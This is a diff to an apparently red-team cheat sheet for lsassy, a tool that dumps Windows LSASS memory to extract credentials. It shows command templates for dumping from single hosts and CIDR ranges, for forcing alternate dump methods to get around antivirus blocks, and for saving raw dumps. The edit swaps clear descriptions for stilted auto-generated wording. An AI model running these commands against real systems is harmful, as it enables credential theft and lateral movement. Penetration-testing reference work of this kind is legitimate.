@@ -25,9 +25,9 @@ fi
 
 ### single host
 
-Dump LSASS on a single host and parse credentials locally.
+Dump single host with Lsassy.
 
-```sh title:"Dump LSASS on one host, parse creds locally"
+```sh title:"Lsassy Dump Single Host"
 lsassy -d $domain -u $user $auth_flags $rhost_ip
 ```
 <!-- cheat
@@ -38,9 +38,9 @@ import lsassy_auth
 
 ### range / CIDR
 
-Sweep an IP range, dumping LSASS wherever the creds work. Auto-skips unreachable hosts.
+Dump range / CIDR with Lsassy.
 
-```sh title:"Sweep CIDR, dump LSASS where creds succeed"
+```sh title:"Lsassy Dump Range / CIDR"
 lsassy -d $domain -u $user $auth_flags $cidr
 ```
 <!-- cheat
@@ -52,9 +52,9 @@ var cidr
 
 ### specify dump method
 
-Force a specific dumper (`comsvcs`, `procdump`, `dllinject`, `nanodump`, etc.) when the default is blocked by AV.
+Dump specify dump method with Lsassy.
 
-```sh title:"Force dump method when default is AV-blocked"
+```sh title:"Lsassy Dump Specify Dump Method"
 lsassy -d $domain -u $user $auth_flags -m $dump_method $rhost_ip
 ```
 <!-- cheat
@@ -66,9 +66,9 @@ var dump_method = printf '%s\n' 'comsvcs' 'procdump' 'dllinject' 'nanodump' 'mir
 
 ### keep raw dump
 
-Save the raw LSASS dump alongside parsing - useful for offline pypykatz analysis if lsassy's parser misses something.
+Dump keep raw dump with Lsassy.
 
-```sh title:"Save raw LSASS dump for offline pypykatz"
+```sh title:"Lsassy Dump Keep Raw Dump"
 lsassy -d $domain -u $user $auth_flags -r --dumpfile $dump_path $rhost_ip
 ```
 <!-- cheat
